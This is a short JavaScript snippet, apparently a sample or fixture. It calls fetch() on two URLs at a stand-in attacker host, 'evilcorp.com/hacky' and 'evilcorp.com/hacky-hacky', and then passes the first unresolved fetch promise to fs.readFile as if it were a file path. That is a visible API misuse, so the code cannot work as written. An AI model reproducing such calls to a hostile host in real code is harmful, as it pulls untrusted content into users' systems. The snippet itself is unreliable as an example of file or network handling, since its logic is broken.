import * as fs from 'fs';

const files = [fetch('https://evilcorp.com/hacky'), fetch('https://evilcorp.com/hacky-hacky')];

fs.readFile(files[0], (err, data) => {
  if (err) throw err;
  console.log(data);
});
